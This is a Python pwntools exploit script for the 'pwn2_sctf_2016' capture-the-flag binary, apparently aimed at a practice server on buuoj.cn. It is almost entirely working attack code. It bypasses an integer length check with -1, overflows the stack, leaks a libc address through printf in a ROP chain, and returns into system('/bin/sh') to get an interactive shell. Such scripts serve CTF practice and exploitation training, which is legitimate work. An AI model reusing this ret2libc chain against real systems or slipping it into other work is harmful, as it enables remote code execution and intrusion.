from pwn import *
from LibcSearcher import LibcSearcher

############################
#********修改文件名**********
############################
file_name = 'pwn2_sctf_2016'
port = 29610
io = -1

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80489a\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))
context.log_level = 'debug'
log.success('='*100)
##########################下面为攻击代码#######################
##########################下面为攻击代码#######################

vuln_addr = io_elf.sym['vuln']
printf_plt_addr = io_elf.plt['printf']
libc_start_main_got = io_elf.got['__libc_start_main']
pop_ret = 0x0804835d

LOG_ADDR_SUCCESS('vuln_addr', vuln_addr)
LOG_ADDR_SUCCESS('printf_plt_addr', printf_plt_addr)
LOG_ADDR_SUCCESS('libc_start_main_got', libc_start_main_got)

# 绕过整数校验
io.sendlineafter("How many bytes do you want me to read? ", b'-1')
io.recvuntil('bytes of data!\n')
# 利用printf泄露基地址
payload = (0x2c + 4) * b'a' + p32(printf_plt_addr) + p32(pop_ret) + p32(libc_start_main_got) + p32(vuln_addr)
io.sendline(payload)
message = io.recv()
index = message.index(b'\x0a')
libc_start_main_addr = message[index + 1: index + 1 + 4]
libc_start_main_addr = u32(libc_start_main_addr.ljust(4, b'\x00'))
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libc_base_addr = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libc_base_addr + libc.dump('system')
str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')


LOG_ADDR_SUCCESS('libc_start_main_addr', libc_start_main_addr)
LOG_ADDR_SUCCESS('libc_base_addr', libc_base_addr)
LOG_ADDR_SUCCESS('sytem_addr', system_addr)
LOG_ADDR_SUCCESS('str_bin_sh', str_bin_sh)

io.sendline(b'-1')
io.recvuntil('bytes of data!\n')

payload = (0x2c + 4) * b'a' +p32(system_addr) + p32(vuln_addr) + p32(str_bin_sh)
io.sendline(payload)

io.interactive()